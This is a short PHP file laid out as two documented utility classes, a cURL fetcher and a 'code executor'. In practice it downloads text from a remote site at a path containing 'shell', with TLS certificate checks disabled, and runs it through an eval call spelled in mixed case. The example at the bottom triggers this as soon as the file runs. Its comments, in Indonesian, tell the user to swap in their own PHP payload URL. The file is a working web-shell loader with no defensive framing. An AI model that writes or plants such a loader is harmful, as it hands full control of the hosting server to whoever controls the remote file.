<?php

/**
 * Class CurlFetcher
 *
 * Handles fetching content from URLs using cURL in an object-oriented manner.
 */
class CurlFetcher
{
    /**
     * Fetches content from the specified URL.
     *
     * @param string $url The URL to fetch content from.
     * @return string|false The response content as a string, or false if the operation fails.
     */
    public function fetchContent(string $url)
    {
        if (function_exists('curl_version')) {
            $curl = curl_init();

            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_HEADER, 0);
            curl_setopt($curl, CURLOPT_TIMEOUT, 10);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);

            $response = curl_exec($curl);

            if (curl_errno($curl)) {
                $error = curl_error($curl);
                curl_close($curl);
                throw new Exception("cURL Error: " . $error);
            }

            curl_close($curl);
            return $response;
        }

        throw new Exception("cURL is not enabled on this server.");
    }
}

/**
 * Class CodeExecutor
 *
 * Handles the execution of PHP code fetched from an external source.
 */
class CodeExecutor
{
    private $fetcher;

    /**
     * Constructor to initialize the fetcher instance.
     *
     * @param CurlFetcher $fetcher An instance of the CurlFetcher class.
     */
    public function __construct(CurlFetcher $fetcher)
    {
        $this->fetcher = $fetcher;
    }

    /**
     * Executes PHP code fetched from the given URL.
     *
     * @param string $url The URL containing the PHP code to execute.
     * @return void
     * @throws Exception If the fetch operation fails or the fetched code is empty.
     */
    public function executeCodeFromURL(string $url): void
    {
        $code = $this->fetcher->fetchContent($url);

        if ($code === false || trim($code) === '') {
            throw new Exception("Failed to fetch content from URL or the content is empty.");
        }

        // Jalankan kode yang diambil
        EvaL("?>" . $code);
    }
}

// Example Usage
try {
    $fetcher = new CurlFetcher();
    $executor = new CodeExecutor($fetcher);

    // Ganti URL ini dengan file PHP kamu yang valid
    $executor->executeCodeFromURL("https://obeydasupreme.site/shell/obs1.txt");
} catch (Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}

